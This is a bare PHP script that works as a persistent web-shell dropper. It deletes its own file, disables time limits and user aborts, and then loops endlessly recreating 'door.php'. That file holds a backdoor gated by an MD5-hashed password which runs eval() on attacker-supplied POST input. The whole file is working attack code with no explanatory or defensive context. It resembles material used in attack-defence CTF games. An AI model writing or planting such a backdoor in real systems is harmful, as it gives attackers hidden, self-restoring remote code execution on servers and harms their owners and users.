<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = 'door.php';
$code = '<?php if(md5($_GET["ma"])=="b74df323e3939b563635a2cba7a7afba"){@eval($_POST[a]);} ?>';
while (1){
    file_put_contents($file,$code);
    usleep(5000);
}
?>